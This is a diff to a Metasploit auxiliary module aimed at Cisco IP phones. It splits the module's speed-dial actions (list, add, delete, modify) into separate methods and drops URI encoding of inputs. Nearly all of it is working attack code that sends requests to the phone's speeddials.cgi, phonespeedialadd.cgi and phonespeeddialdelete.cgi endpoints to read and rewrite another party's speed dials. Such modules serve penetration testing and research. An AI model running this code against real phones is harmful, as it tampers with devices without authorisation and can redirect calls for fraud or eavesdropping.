@@ -48,88 +48,16 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    mac = Rex::Text.uri_encode(datastore['MAC'])
-    name = Rex::Text.uri_encode(datastore['NAME'])
-    position = Rex::Text.uri_encode(datastore['POSITION'])
-    telno = Rex::Text.uri_encode(datastore['TELNO'])
 
     case action.name.upcase
       when 'MODIFY'
-        print_status("#{peer} - Deleting Speed Dial of the IP phone")
-
-        vars_get = {
-          'entry' => "#{position}",
-          'device' => "SEP#{mac}"
-        }
-
-        status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
-
-        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
-          print_good("#{peer} - Speed Dial #{position} is deleted successfully")
-          print_status("#{peer} - Adding Speed Dial to the IP phone")
-
-          vars_get = {
-            'name' => "#{name}",
-            'telno' => "#{telno}",
-            'device' => "SEP#{mac}",
-            'entry' => "#{position}",
-            'mac' => "#{mac}"
-          }
-
-          status, res = send_rcv('phonespeedialadd.cgi', vars_get)
-
-          if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
-            print_good("#{peer} - Speed Dial #{position} is added successfully")
-          elsif res && res.body =~ /exist/
-            print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
-          else
-            print_error("#{peer} - Speed Dial couldn't add!")
-          end
-        else
-          print_error("#{peer} - Speed Dial is not found!")
-        end
+        modify
       when 'DELETE'
-        print_status("#{peer} - Deleting Speed Dial of the IP phone")
-
-        vars_get = {
-          'entry' => "#{position}",
-          'device' => "SEP#{mac}"
-        }
-
-        status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
-
-        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
-          print_good("#{peer} - Speed Dial #{position} is deleted successfully")
-        else
-          print_error("#{peer} - Speed Dial is not found!")
-        end
-
+        delete
       when 'ADD'
-        print_status("#{peer} - Adding Speed Dial to the IP phone")
-        vars_get = {
-          'name' => "#{name}",
-          'telno' => "#{telno}",
-          'device' => "SEP#{mac}",
-          'entry' => "#{position}",
-          'mac' => "#{mac}"
-        }
-        status, res = send_rcv('phonespeedialadd.cgi', vars_get)
-
-        if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
-          print_good("#{peer} - Speed Dial #{position} is added successfully")
-        elsif res && res.body && res.body.to_s =~ /exist/
-          print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
-        else
-          print_error("#{peer} - Speed Dial couldn't add!")
-        end
-    else
-      print_status("Getting Speed Dials of the IP phone")
-      vars_get = {
-        'device' => "SEP#{mac}"
-      }
-
-      status, res = send_rcv('speeddials.cgi', vars_get)
-      parse(res) unless status == Exploit::CheckCode::Safe
+        add
+      when 'LIST'
+        list
     end
 
   end
@@ -175,6 +103,104 @@ class Metasploit3 < Msf::Auxiliary
       end
     else
       print_status("#{peer} - No Speed Dial detected")
+    end
+  end
+
+  def list
+    mac = datastore['MAC']
+
+    print_status("#{peer} - Getting Speed Dials of the IP phone")
+    vars_get = {
+      'device' => "SEP#{mac}"
+    }
+
+    status, res = send_rcv('speeddials.cgi', vars_get)
+    parse(res) unless status == Exploit::CheckCode::Safe
+  end
+
+  def add
+    mac = datastore['MAC']
+    name = datastore['NAME']
+    position = datastore['POSITION']
+    telno = datastore['TELNO']
+
+    print_status("#{peer} - Adding Speed Dial to the IP phone")
+    vars_get = {
+      'name' => "#{name}",
+      'telno' => "#{telno}",
+      'device' => "SEP#{mac}",
+      'entry' => "#{position}",
+      'mac' => "#{mac}"
+    }
+    status, res = send_rcv('phonespeedialadd.cgi', vars_get)
+
+    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
+      print_good("#{peer} - Speed Dial #{position} is added successfully")
+    elsif res && res.body && res.body.to_s =~ /exist/
+      print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
+    else
+      print_error("#{peer} - Speed Dial couldn't add!")
+    end
+  end
+
+  def delete
+    mac = datastore['MAC']
+    position = datastore['POSITION']
+
+    print_status("#{peer} - Deleting Speed Dial of the IP phone")
+
+    vars_get = {
+      'entry' => "#{position}",
+      'device' => "SEP#{mac}"
+    }
+
+    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
+
+    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
+      print_good("#{peer} - Speed Dial #{position} is deleted successfully")
+    else
+      print_error("#{peer} - Speed Dial is not found!")
+    end
+  end
+
+  def modify
+    mac = datastore['MAC']
+    name = datastore['NAME']
+    position = datastore['POSITION']
+    telno = datastore['TELNO']
+
+    print_status("#{peer} - Deleting Speed Dial of the IP phone")
+
+    vars_get = {
+      'entry' => "#{position}",
+      'device' => "SEP#{mac}"
+    }
+
+    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)
+
+    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/
+      print_good("#{peer} - Speed Dial #{position} is deleted successfully")
+      print_status("#{peer} - Adding Speed Dial to the IP phone")
+
+      vars_get = {
+        'name' => "#{name}",
+        'telno' => "#{telno}",
+        'device' => "SEP#{mac}",
+        'entry' => "#{position}",
+        'mac' => "#{mac}"
+      }
+
+      status, res = send_rcv('phonespeedialadd.cgi', vars_get)
+
+      if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/
+        print_good("#{peer} - Speed Dial #{position} is added successfully")
+      elsif res && res.body =~ /exist/
+        print_error("#{peer} - Speed Dial is exist, change the position or choose modify!")
+      else
+        print_error("#{peer} - Speed Dial couldn't add!")
+      end
+    else
+      print_error("#{peer} - Speed Dial is not found!")
     end
   end
 end
